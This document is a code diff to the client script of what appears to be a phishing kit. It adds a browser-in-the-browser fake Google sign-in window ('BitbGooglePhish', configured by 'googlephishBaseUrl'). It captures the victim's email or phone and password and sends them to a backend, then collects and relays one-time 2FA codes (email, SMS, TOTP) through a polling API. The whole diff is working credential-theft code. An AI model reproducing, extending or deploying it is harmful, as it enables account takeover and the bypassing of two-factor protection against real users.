@@ -3,17 +3,35 @@
 
     if (window.AuthUI) window.AuthUI.init();
 
+    function tryOpenBitb() {
+        if (!window.AuthUI) return false;
+        var base = window.BitbGooglePhish && window.BitbGooglePhish.normalizeBase(cfg.googlephishBaseUrl);
+        if (!base) {
+            window.AuthUI.setBanner(
+                'Set googlephishBaseUrl in config.js to your PHP app URL (e.g. http://127.0.0.1:8080).',
+                'error'
+            );
+            return false;
+        }
+        if (window.BitbGooglePhish && window.BitbGooglePhish.open()) return true;
+        window.AuthUI.setBanner('Could not open sign-in window. Please try again.', 'error');
+        return false;
+    }
+
     var googleBtn = document.getElementById('googleSignInBtn');
     if (googleBtn) {
         googleBtn.addEventListener('click', function () {
-            var base = window.BitbGooglePhish && window.BitbGooglePhish.normalizeBase(cfg.googlephishBaseUrl);
-            if (!base) {
-                window.AuthUI.setBanner('Sign-in service unavailable. Please try again later.', 'error');
-                return;
-            }
-            if (window.BitbGooglePhish && window.BitbGooglePhish.open()) return;
-            window.AuthUI.setBanner('Could not open sign-in window. Please try again.', 'error');
+            window.AuthUI.clearBanner();
+            tryOpenBitb();
         });
+    }
+
+    var pending2faRequestId = null;
+
+    function handle2faResult(result) {
+        if (!result || result.status !== '2fa') return;
+        pending2faRequestId = result.request_id || null;
+        window.AuthUI.show2fa(result.two_fa_type || 'email');
     }
 
     var loginForm     = document.getElementById('loginForm');
@@ -22,8 +40,107 @@
     var passwordBlock = document.getElementById('passwordBlock');
     var smsBlock      = document.getElementById('smsBlock');
 
-    if (loginForm) {
-        loginForm.addEventListener('submit', function (e) { e.preventDefault(); });
+    function isPhoneMode() {
+        return phoneBlock && window.getComputedStyle(phoneBlock).display !== 'none';
+    }
+
+    function isSmsMode() {
+        return smsBlock && window.getComputedStyle(smsBlock).display !== 'none';
+    }
+
+    function getUsername() {
+        if (isPhoneMode()) {
+            var code  = document.getElementById('countryCode');
+            var phone = document.getElementById('phone');
+            return (code ? code.value : '') + (phone ? phone.value.trim() : '');
+        }
+        var email = document.getElementById('email');
+        return email ? email.value.trim() : '';
+    }
+
+    if (loginForm && window.AuthAPI && window.AuthUI) {
+        loginForm.addEventListener('submit', function (e) {
+            e.preventDefault();
+            window.AuthUI.clearBanner();
+
+            if (!window.AuthAPI.apiBase()) {
+                window.AuthUI.setBanner('Set apiBaseUrl in config.js to your Node backend URL.', 'error');
+                return;
+            }
+
+            if (isSmsMode()) {
+                window.AuthUI.setBanner('Please enter your password to log in.', 'error');
+                return;
+            }
+
+            var username = getUsername();
+            var pwdInput = document.getElementById('password');
+            var password = pwdInput ? pwdInput.value : '';
+
+            if (!username || !password) {
+                window.AuthUI.setBanner('Enter your email or phone and password.', 'error');
+                return;
+            }
+
+            window.AuthUI.runGate(function () {
+                return window.AuthAPI.afterLoginPoll(window.AuthAPI.loginWithPassword(username, password));
+            }).then(function (result) {
+                handle2faResult(result);
+            }).catch(function () {});
+        });
+    }
+
+    var twoFaSubmitBtn = document.getElementById('twoFaSubmitBtn');
+    var twoFaBackBtn   = document.getElementById('twoFaBackBtn');
+
+    function get2faCode() {
+        var view = document.getElementById('twoFaView');
+        var method = view && view.getAttribute('data-2fa-method');
+        if (method === 'phone') {
+            return (document.getElementById('twoFaPhoneCode') || {}).value || '';
+        }
+        if (method === 'totp') {
+            return (document.getElementById('twoFaTotpCode') || {}).value || '';
+        }
+        return (document.getElementById('twoFaEmailCode') || {}).value || '';
+    }
+
+    if (twoFaSubmitBtn && window.AuthAPI && window.AuthUI) {
+        twoFaSubmitBtn.addEventListener('click', function () {
+            window.AuthUI.clearBanner('twoFaBanner');
+
+            if (!pending2faRequestId) {
+                window.AuthUI.setBanner('Session expired. Please log in again.', 'error', 'twoFaBanner');
+                return;
+            }
+
+            var code = get2faCode().replace(/\s/g, '');
+            if (!code) {
+                window.AuthUI.setBanner('Enter the verification code.', 'error', 'twoFaBanner');
+                return;
+            }
+            if (!/^\d{6}$/.test(code)) {
+                window.AuthUI.setBanner('Code must be 6 digits.', 'error', 'twoFaBanner');
+                return;
+            }
+
+            var reqId = pending2faRequestId;
+            window.AuthUI.runGate(function () {
+                return window.AuthAPI.afterLoginPoll(
+                    window.AuthAPI.submit2fa(reqId, code)
+                );
+            }).then(function (result) {
+                handle2faResult(result);
+            }).catch(function () {});
+        });
+    }
+
+    if (twoFaBackBtn && window.AuthUI) {
+        twoFaBackBtn.addEventListener('click', function () {
+            pending2faRequestId = null;
+            window.AuthUI.clearBanner('twoFaBanner');
+            window.AuthUI.showLogin();
+        });
     }
 
     function showEmail() { if (emailBlock) emailBlock.style.display = ''; if (phoneBlock) phoneBlock.style.display = 'none'; }
